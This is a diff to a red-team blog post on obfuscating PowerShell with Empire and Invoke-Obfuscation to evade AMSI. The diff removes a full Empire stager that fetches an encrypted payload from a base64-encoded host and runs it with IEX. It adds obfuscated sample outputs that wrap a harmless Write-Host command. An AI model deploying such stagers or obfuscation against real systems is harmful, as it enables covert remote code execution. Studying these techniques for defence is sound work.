@@ -169,7 +169,7 @@ If you have not already viewed Daniel Bohannon's presentations about <a href="ht
 "ScriptPath" is setting the path for reading the content from a file, in my case will be "/tmp/test.ps1", where test.ps1 is containing the following code:
 
 {% highlight powershell %}
-$ErrorActionPreference = "SilentlyContinue";$ebDd=NEW-ObjecT SySteM.NET.WeBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TEXt.ENCODInG]::UNICoDe.GeTStRiNG([ConVert]::FrOmBaSe64STRIng('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA2ADAALgAxADMANAA6ADgAMAA=')));$t='/news.php';$EbdD.HeADErS.ADD('User-Agent',$u);$EBdD.ProXy=[SySTem.Net.WebREqUEst]::DeFaulTWEbPrOXy;$EBdD.PrOXY.CredEnTIALs = [SYsTem.NET.CredenTIAlCACHe]::DeFauLtNetWoRKCreDenTIAls;$Script:Proxy = $ebdd.Proxy;$K=[SySTeM.Text.ENcOdiNG]::ASCII.GEtBytEs('*VWR/g_v[59+~38qlKjd6(hcws|#ON0B');$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$eBdd.HEadErS.ADD("Cookie","bBxqmHhF=Xw9FMjBYWNyNHKSPRXrSEYxLcPA=");$DAtA=$ebDD.DOWnlOAdDaTA($ser+$T);$IV=$daTA[0..3];$DAtA=$DATA[4..$DAtA.LENGth];-joiN[CHAr[]](& $R $dATA ($IV+$K))|IEX
+Write-Host "I like WHmacmac's articles" -ForegroundColor Blue
 
 {% endhighlight %}
 
@@ -181,6 +181,13 @@ The most used obfuscation method in our days is based on token, in special Empir
 <center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/token.png">
  </center>
 </div>
+
+Example of output:
+{% highlight powershell %}
+.("{0}{2}{1}" -f 'Wri','-Host','te') ("{3}{1}{2}{0}{4}"-f 'ti','voke-O','bfusca','In','on') -ForegroundColor ("{0}{1}"-f'Bl','ue')
+
+{% endhighlight %}
+
 However beucase it was extremely used in the last years, this will get you caught.
 It is recommended to run whitespace last (at least 2-3 times).
 
@@ -203,6 +210,11 @@ It is used to mask the payload by converting the format in Hex, ASCI, Binary, AE
  </center>
 </div>
 
+Example of output:
+{% highlight powershell %}
+& ((VaRIAble '*mdr*').nAmE[3,11,2]-JOIN'')( ([RUNTimE.intEropservIcEs.MARsHaL]::PTrtOStrInGAuTo([RUNtImE.iNteROPSERvIceS.mARShAL]::sEcuREsTRInGToBsTr( $('76492d1116743f0423413b16050a5345MgB8AEwAcgA2AHcAZgBZAGEAVgBrAEUAWQBmADYAUQBtAHMARABZAFoAbgBPAEEAPQA9AHwAOAAxADYAYQAxADgAZABlADEANAAwAGIAZQBkAGEAYwAwADkAMgAxAGYANQA0ADEAZABmADYAYgBmAGEAMgA3ADIAMQAxADIANgBiADIAYQBmAGIANwBmADkAZAA4ADgAYwAxADYAMwBkADEAYgAzADUAMwBkAGIANwAzADcANABhADAANgAxAGMANgAxADQAYQA0ADcANAAyAGUAMABlADcAMgA0ADkAYgAyAGQAYwBhADMAZgBhAGUAYQBhADUAYgA3ADcANAA2ADQAMABmADYANgAxADYAOQBlADkAMQAyAGIAMgBiADEAOAA1ADUANgBmAGIANQAxADEANgA0ADkAMQBkAGQAZQA3ADUAMAA1ADUAMgAxADEAZAAyADcAMgA3ADEAZgA2ADQAYwAxADkANAA1ADUAOQBkAGMAZQA5AGMANQBkADQAMwBkADUAZQA0AGUAYQA2ADkAMABlAGEAZAA1AGIAZABlAGMAOQBiADIAZQA4ADAANQA0ADEAMgA5ADcANwA4ADMAZABkAGYANAA4AGUAZAAxAGMAMwA4AGEAMwAyADUAYwAzADQAMQBlAGMAYgA2ADMAYQA5AA==' |CoNverttO-SecuRestRinG  -keY  (100..69)) ) ) )
+
+{% endhighlight %}
 
 <br/><b>4. String Obfuscation</b><br/>
 Obfuscated Powershell code as a string.<br/>
@@ -211,6 +223,11 @@ Breaks up the code with reversing techniques and concatenation.
 <center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/string.png">
  </center>
 </div>
+
+{% highlight powershell %}
+iNVOkE-EXPressION( (('Write-Host {'+'0'+'}'+'Inv'+'o'+'ke-O'+'bf'+'u'+'sca'+'tion{0}'+' -F'+'or'+'egroundC'+'o'+'lor '+'B'+'l'+'ue')-f  [ChAR]34) )
+
+{% endhighlight %}
 
 <br/><b>5. Compress Obfuscation</b><br/>
 
@@ -225,6 +242,14 @@ Breaks up the code with reversing techniques and concatenation.
  </center>
 </div>
 
+Example of output:
+
+{% highlight powershell %}
+( new-oBjeCt  SYStEm.IO.strEamReaDer(( new-oBjeCt  SystEM.io.CompREsSIoN.DeFLAtestrEaM([SySTeM.iO.MEmorYSTREaM] [coNvert]::frOmbasE64StrING( 'Cy/KLEnV9cgvLlFQ8swry89O1fVPSistTk4syczPU1LQdcsvSk0vyi/NS3HOz8kvUnDKKU3lAgA=' ), [SYStEm.io.cOMprEssion.cOMprEssiONMoDe]::deCOMPrEsS ) ),[TeXt.eNCODiNG]::ASCii)).rEaDToEnd( ) |&( $pshOme[4]+$Pshome[30]+'X')
+
+{% endhighlight %}
+
+
 <br/><b>6. Obfuscate Command Args</b><br/>
 Many pentesters are underestimated the Launcher obfuscation in their malware development phases. In the below image we can what methods of launcher obfuscation are available for us. 
 <div>
@@ -237,6 +262,12 @@ As we can see many of them are including "somethingbla IEX". Microsoft learnt fr
  </center>
 </div>
 Empire already includes a launcher based on IEX. At this moment the community/I do not know a replacement for IEX. Maybe there is but Microsoft did not document all of these little tricks because they do not wanna let the APTs to take advantage of it.
+
+Example of output:
+{% highlight powershell %}
+C:\wINdOws\sySTEm32\wBEm\WmIC prOcESS    "call"   'CREAte' "POwErShElL   Write-Host "\"Invoke-Obfuscation"\" -ForegroundColor Blue"
+
+{% endhighlight %}
 
 <br/><b>Conclusions</b><br/>
 Empire has integrated Invoke Obfuscation in its stager's console.<br/>
@@ -268,6 +299,5 @@ https://www.bc-security.org/post/the-empire-3-0-strikes-back<br/>
 https://github.com/BC-SECURITY/Empire<br/>
 https://docs.microsoft.com/en-us/windows/win32/api/amsi/<br/>
 https://threatvector.cylance.com/en_us/home/how-to-implement-anti-malware-scanning-interface-provider.html<br/>
-https://www.bc-security.org/post/the-empire-3-0-strikes-back<br/>
 https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/<br/>
 https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/<br/>
